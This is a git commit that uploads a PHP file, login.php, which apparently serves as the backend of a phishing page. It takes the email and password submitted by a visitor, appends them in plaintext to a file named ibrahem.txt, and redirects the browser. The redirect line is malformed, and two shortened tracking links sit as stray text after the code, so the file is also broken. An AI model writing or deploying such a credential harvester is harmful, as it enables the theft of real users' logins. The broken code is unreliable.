2c5ec6628d0d9eb26456c3f6c9dece41a6341193
ibrahemsaied250 <79212222+ibrahemsaied250@users.noreply.github.com>
2021-02-17 18:17:56 +0200

    Add files via upload

---
+++ login.php
@@ -0,0 +1,10 @@
+<?php
+
+file_put_contents("../ibrahem.txt", "  " . $_POST['email'] . "  :  " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location:'');
+exit();
+
+
+
+https://smrturl.co/o/165276/53187056?s1=53187056 
+https://smrturl.co/o/165276/53187056?s1=
